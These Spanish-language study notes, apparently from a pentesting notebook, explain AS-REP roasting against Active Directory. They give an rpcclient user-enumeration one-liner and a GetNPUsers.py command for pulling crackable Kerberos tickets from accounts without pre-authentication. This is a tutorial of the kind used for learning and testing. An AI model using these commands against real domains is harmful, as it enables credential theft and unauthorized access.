## Teoría 

Este tipo de ataque solo puede surtir efecto cuando algún usuario tiene desactivada la autenticación previa de kerberos, en este caso, como dice el nombre no se pide una autenticación previa, por lo que podemos hacer uso de la herramienta GetNPUsers.py para listar que usuarios tiene esta opción deshabilitada.


Para entender la teoría de este ataque, hay que entender como se comportan los AS-REQ, AS-REP, TGS-REQ y TGS-REP:

![[Pasted image 20250426191205.png]]

Usualmente en el AS-REQ se envía el usuario y una marca de tiempo encriptada con la contraseña del usuario que hace la petición (Request), pero en caso de tener la pre autenticación deshabilitada, se envía la marca de tiempo sin encriptar, y luego recibimos un AS-REP (de ahí el nombre) el cual contiene un TGT encriptado con la contraseña del usuario que hizo la peticion, crackeando este ticket podemos conseguir la contraseña del usuario que tenia el NP (No Preauth) habilitado.

## Practica

Primero debemos tener una lista de usuarios validos de domino, por ejemplo: 

users.txt
```
Juan
Salo
Silvia
Margarita
Jefe
Marketer
```

Hay dos formas de tener esta lista, una de ellas es con fuerza bruta, con una lista de millones de posibles usuarios, pero la mejor forma seria si tenemos alguna credencial, de cualquier usuario (NO tiene que tener permisos administrativos), y ya teniendo eso, usar el siguiente comando:

```shell
rpcclient -U "{DOMINIO}/{USUARIO}%{CONTRASEÑA}" -c 'enumdomusers' | grep -oP "\[.+?\]" | grep -v "0x" | tr -d "[]"
```

Ya con la lista de usuarios (users.txt) podemos realizar el ataque: 

```python
GetNPUsers.py -no-pass -usersfile users.txt {DOMINIO}/
```

Si alguno de los usuarios de la lista tiene el NP (No Preauth) deshabilitado nos dará el TGT y podremos crackearlo con John The Reaper para obtener la contraseña del usuario en cuestión.
